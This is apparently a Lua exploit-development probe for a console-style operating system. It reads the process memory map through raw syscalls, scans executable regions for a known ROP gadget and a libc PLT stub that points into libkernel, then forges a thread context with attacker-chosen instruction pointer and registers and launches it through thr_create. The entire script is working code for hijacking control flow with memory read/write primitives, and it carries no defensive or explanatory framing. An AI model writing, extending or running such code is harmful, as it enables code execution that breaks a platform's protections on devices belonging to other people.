-- CRASH_CLASS: HIGH
-- PROBE 614a: can a thr_create child execute libkernel code? (3-arg thr_create, verified gadgets)
print("=== PROBE 614a: CHILD LIBKERNEL CALL ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return N(v) end return nil end
local function rd8(a) local ok,v=pcall(function() return memory.read_byte(a) end) if ok then return N(v) end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function lo(a) return math.floor(a%4294967296) end
local function hi(a) return math.floor(a/4294967296) end

local sc674=mk(674)
local bufp=memory.alloc(0x20000)
local cnt=memory.alloc(4) wd(N(cnt),0)
pcall(function() sc674(U(N(bufp)),uint64(72),uint64(512),U(N(cnt)),uint64(0x40000000),uint64(0)) end)
local n=rd(N(cnt)) or 0
print(string.format("[A] regions=%d",n))

-- eboot = the prot-5 region holding 48 89 07 C3 at +0x92C67 (mov [rdi],rax; ret)
local eboot=nil
local prot5={}
for i=0,n-1 do
    local b=N(bufp)+i*72
    local start=N(rq(b))
    local send=N(rq(b+8))
    local prot=rd(b+0x18)
    if prot==5 then
        prot5[#prot5+1]=start
        if send-start>0x92C6B and rd8(start+0x92C67)==0x48 and rd8(start+0x92C68)==0x89 and rd8(start+0x92C69)==0x07 and rd8(start+0x92C6A)==0xC3 then
            eboot=start
        end
    end
end
print(string.format("[B] prot5 regions=%d eboot=%08X_%08X",#prot5,hi(eboot or 0),lo(eboot or 0)))
if not eboot then
    for _,s in ipairs(prot5) do print(string.format("   prot5 %08X_%08X",hi(s),lo(s))) end
    print("[!] eboot not identified"); return
end
local mover=eboot+0x92C67
local spin=eboot+0x15481
print(string.format("[C] mover=%08X_%08X spin=%08X_%08X",hi(mover),lo(mover),hi(spin),lo(spin)))

-- libkernel address from a libc PLT stub found by scanning prot-5 pages for FF 25
local target=nil
for _,s in ipairs(prot5) do
    for off=0,0x7F0,16 do
        local a=s+off
        if rd8(a)==0xFF and rd8(a+1)==0x25 then
            local d=rd(a+2)
            if d and d>=0x80000000 then d=d-0x100000000 end
            local slot=a+6+d
            local v=rq(slot)
            if v and v>0x100000 then target=v print(string.format("[D] stub@%08X_%08X -> 0x%08X_%08X",hi(a),lo(a),hi(v),lo(v))) end
            break
        end
    end
    if target then break end
end
if not target then print("[!] no PLT stub"); return end

local sc430=mk(430)
local mark=memory.alloc(0x4000)
local ctx=memory.alloc(0x500)
local stack=memory.alloc(0x10000)

local function launch(tag,rip,rax,rdi)
    wq(N(mark),uint64(0x1111111111111111))
    for i=0,0x4FC,4 do wd(N(ctx)+i,0) end
    wq(N(ctx)+0x108,uint64(0x480))
    wd(N(ctx)+0x0d0,1)
    wq(N(ctx)+0x110,uint64(0x10000))
    wq(N(ctx)+0x0c0,uint64(0x43))
    wq(N(ctx)+0x100,uint64(0x3b))
    wq(N(ctx)+0x0e0,U(rip))
    wq(N(ctx)+0x0f8,U(N(stack)+0x10000-8))
    wq(N(ctx)+0x048,U(rax or 0))
    wq(N(ctx)+0x060,U(0))
    wq(N(ctx)+0x068,U(0))
    wq(N(ctx)+0x070,U(rdi or 0))
    wq(N(stack)+0x10000-8,U(spin))
    local tid=memory.alloc(16) wq(N(tid),uint64(0))
    local ok,rv=pcall(function() return sc430(U(N(ctx)),U(N(tid)),uint64(0)) end)
    print(string.format("[%s] ok=%s rv=%s tid=%s",tag,tostring(ok),tostring(ok and N(rv) or "err"),tostring(rd(N(tid)))))
    for i=1,400 do pcall(function() return rd(N(mark)) end) end
    local m=N(rq(N(mark)))
    print(string.format("[%s] marker=%08X_%08X",tag,hi(m),lo(m)))
end

print("[S1] child runs an eboot gadget")
launch("S1",mover,0xCAFEBABE,N(mark))
print("[S2] child jumps to the libkernel target")
launch("S2",target,0,0)
print("[Z] alive")
